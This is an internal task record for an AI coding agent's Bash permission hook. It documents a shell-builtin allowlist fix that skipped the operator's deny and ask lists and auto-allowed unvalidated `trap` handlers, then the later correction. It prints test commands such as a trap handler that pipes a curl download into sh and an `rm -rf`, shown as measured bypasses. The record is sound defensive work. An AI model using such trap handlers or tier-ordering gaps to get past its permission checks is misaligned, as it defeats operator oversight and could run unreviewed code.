# Task 25 — Parser: incomplete shell-builtin allowlist

**Status:** landed, **reopened** (2026-08-27), **fixed in
[task 28](./28_safe_builtins_bypass.md)** (repo copy; not installed) ·
**Type:** bug · **Owner:** Anton
**Landed as:** `6283e6b` *fix(pretool): curated safe-builtin category in the Bash validator*
**Reopened because:** the shipped fix bypasses `permissions.deny` and
`permissions.ask`, and auto-allows an uninspected `trap` handler. See §11.
**Filed by:** daily permission reviewer 2026-08-26 (queue entry 20260826T135656Z_2b0e6439)  
**Source:** fixture-agent @ hyppie-flow, session fixture-session-cccc3333

## Reported command

```
trap 'rm -f temp/review.lock' EXIT; python3 tests/run_all_tests.py
```

## Reproduction (confirmed 2026-08-26)

```
$ printf '%s\n' '{"command": "trap '\''rm -f temp/review.lock'\'' EXIT; python3 tests/run_all_tests.py"}' \
    | CLAUDE_HOOK_REPLAY=1 python3 .claude/hooks/pretool_hook.py --dry-run

Decision: ask
Reason: Not in allowlist — review before approving: `trap 'rm -f temp/review.lock' EXIT`
Sub-commands: ["trap 'rm -f temp/review.lock' EXIT", 'python3 tests/run_all_tests.py']
```

Sub-command split is correct. The validator sees two sub-commands, checks each
against patterns, and blocks on `trap` — which has no pattern.

## Root cause

The validator handles POSIX shell builtins one pattern at a time. Currently
allowlisted: `set`, `export`, `source`, `read`, `for`, `done`, `fi`, `break`.
Not allowlisted (and therefore asking): `trap`, `shift`, `local`, `wait`,
`umask`, `ulimit`, `getopts`, `return`, `continue`, `unset`, `readonly`, and
others.

`eval` is deliberately absent from this list — it executes arbitrary strings
and should stay in the ask/human tier regardless.

## Why this is structural

Patching `Bash(trap:*)` alone would fix this one report but leave the other
missing builtins to surface case-by-case. The right fix is a curated
"known-safe shell builtins" category in the parser with an explicit exclusion
list (`eval`, `exec`, maybe `source` when the argument is a variable).
Deciding which builtins are safe to auto-allow requires human judgment about
the threat model; the reviewer cannot make that call unilaterally.

## Proposed shape of fix

1. In `.claude/hooks/pretool_hook.py` (or the sub-command classifier), add a
   set `SAFE_BUILTINS` covering the already-allowlisted ones plus the safe
   missing ones. Exclude `eval`, `exec`, and any builtin that can load or
   execute external code.
2. A sub-command whose head token is in `SAFE_BUILTINS` is treated as `allow`
   without a pattern lookup.
3. Add test cases in `tests/` for `trap`, `shift`, `local`, `eval` (should
   still ask), and `exec` (should still ask).
4. Remove the individual `Bash(set:*)`, `Bash(export:*)`, etc. pattern entries
   that are now redundant — or leave them for the transition period and note
   they can be pruned later.

## Do not

- Widen `Bash(crontab:*)` → `Bash(crontab -l:*)` (already handled separately)
- Add `Bash(trap:*)` or `Bash(eval:*)` to the allowlist as a workaround —
  that hides the bug and grants more than the structural fix would.

---

## 11. Implementation log

- **2026-08-26 — landed as `6283e6b`.** `SAFE_BUILTINS` added to
  `.claude/hooks/pretool_hook.py` (`:226`) with the head-token check at `:1216`;
  `eval` and `exec` deliberately excluded and documented as must-stay-excluded.
  Tests added in `tests/test_integration_pretool.py:949+`. The reported command
  `trap 'rm -f temp/review.lock' EXIT; python3 tests/run_all_tests.py` now
  decides `allow`. Installed — repo and `~/.claude/hooks/pretool_hook.py` are
  byte-identical as of 2026-08-27 11:36.
  **Step 4 (pruning the now-redundant `Bash(set:*)` … `Bash(read:*)` entries)
  was not done** and is superseded by the finding below.

- **2026-08-27 — reopened. Two defects found by testing the shipped fix.**

  **(a) `SAFE_BUILTINS` bypasses `deny` and `ask`.** The check at
  `pretool_hook.py:1216` returns
  `{'allowed': True, 'denied': False, 'asked': False}` **before** any pattern
  lookup, so for all 19 head tokens in the set the operator's `permissions.deny`
  and `permissions.ask` lists are never consulted. Verified against a scratch
  workspace whose merged settings genuinely carried
  `deny: ['Bash(trap:*)', 'Bash(source:*)']` and `ask: ['Bash(unset:*)']`
  (confirmed via `SettingsLoader.load_all_settings()`): all three decided
  `allow` with reason *"All sub-commands are allowed"*.
  This contradicts **epic 22 invariant 1** ("no path — hook, MCP, or reviewer —
  downgrades a deny match to a prompt") and **D1/D2**, which landed one commit
  earlier in `bb86c5b`. The two changes were never tested against each other.

  **(b) `trap` auto-allows an uninspected handler string.** The file's own
  selection criterion is *"the builtin must NOT be able to execute an arbitrary
  command string"*, and the `trap` comment concedes a literal handler "is NOT
  extracted or validated at trap-registration time — it runs when the signal
  fires." Measured:

  ```
  trap 'curl http://example.com/x | sh' EXIT              -> Decision: allow
  trap 'rm -rf /tmp/nope' EXIT; echo hi                   -> Decision: allow
  ```

  The handler runs in the same shell when it exits, having never been
  validated — the same class of bypass the set excludes `eval` to prevent.
  Combined with (a), it cannot be retracted by adding `Bash(trap:*)` to
  `permissions.deny`.

  **Shape of the fix — applied in [task 28](./28_safe_builtins_bypass.md),
  see the outcome bullet below:**
  1. Move the `SAFE_BUILTINS` check to **after** the deny and ask lookups, so it
     is an *allow*-tier shortcut only — never a deny/ask override.
  2. Either drop `trap` from `SAFE_BUILTINS` and let it ask, or extract and
     validate the handler string as a sub-command the way `$(…)` substitutions
     already are. `source` deserves the same look: it executes a file.
  3. Add regression tests that a denied and an ask-listed builtin actually deny
     and ask — this is what the original test set never asserted.
  4. Only then revisit step 4's pruning: with (1) fixed, the
     `Bash(set:*)`/`Bash(export:*)`/… entries are genuinely redundant and can go,
     since the shortcut would then sit correctly below deny and ask.

- **2026-08-27 — fixed in [task 28](./28_safe_builtins_bypass.md)** (repo copy;
  see task 28 §5 for the implementation log and the review round that followed
  it). Outcome against the three points above:

  1. **Done.** The `SAFE_BUILTINS` head-token check is now an *allow*-tier
     shortcut: `_tier_override_result` runs the deny and ask lookups first and
     wins. The same gate was added to the NOOP-builtin path (`unset`, `set`,
     `read`, … reach auto-allow through `_reduce_to_effective_command`, not
     through the head-token shortcut), and — after review finding MEDIUM 1 — that
     gate now reads the *prefix-peeled* sub-command, so `if unset X`,
     `while read -r line`, `env unset X`, `timeout 5 unset X` and ten more
     spellings can no longer hide the head token from the operator's lists.
  2. **Done, the validating variant.** `trap` stays in `SAFE_BUILTINS`, but the
     handler is extracted and validated as its own sub-command and the trap
     inherits its verdict; anything unparsable, expansion-built, or nested too
     deep asks. Review round 2 added handler-text recovery (a newline inside the
     quoted handler was being collapsed to a space, so only line 1 was ever
     validated) and put the handler through the write-redirect gate.
     `source` shortcuts only an operand with no shell expansion.
  3. **Done.** `tests/test_integration_pretool.py::TestSafeBuiltinsTierOrdering`
     asserts deny-denies / ask-asks for the builtins, per tier and per spelling.

  **Step 4 (pruning), answered:** with point 1 fixed the
  `Bash(set:*)`, `Bash(export:*)`, `Bash(source:*)`, `Bash(read:*)`,
  `Bash(for:*)`, `Bash(done:*)`, `Bash(fi:*)`, `Bash(break:*)`, `Bash(wait:*)`
  entries **are** genuinely redundant — `SAFE_BUILTINS` now covers exactly those
  head tokens and sits below deny/ask, so deleting the patterns cannot make any
  command *less* permitted, and it makes §2.3 (`source "$X"` must fall through to
  the pattern path) actually bite instead of being masked by a blanket
  `Bash(source:*)` allow.

  It is **not** done here, and it is not a repo-only edit:
  `install-claude-config.sh` **unions** the repo's `.claude/settings.json` into
  `~/.claude/settings.json` and never subtracts, so removing an entry from the
  repo file leaves the already-installed copy in the global file untouched and
  still allowing. Pruning therefore needs (a) the repo edit, (b) a manual edit of
  `~/.claude/settings.json`, and (c) a re-measurement of the affected commands —
  three things task 28's scope explicitly excludes ("no settings edits, no
  installer change"). File it as its own change with the operator in the loop.
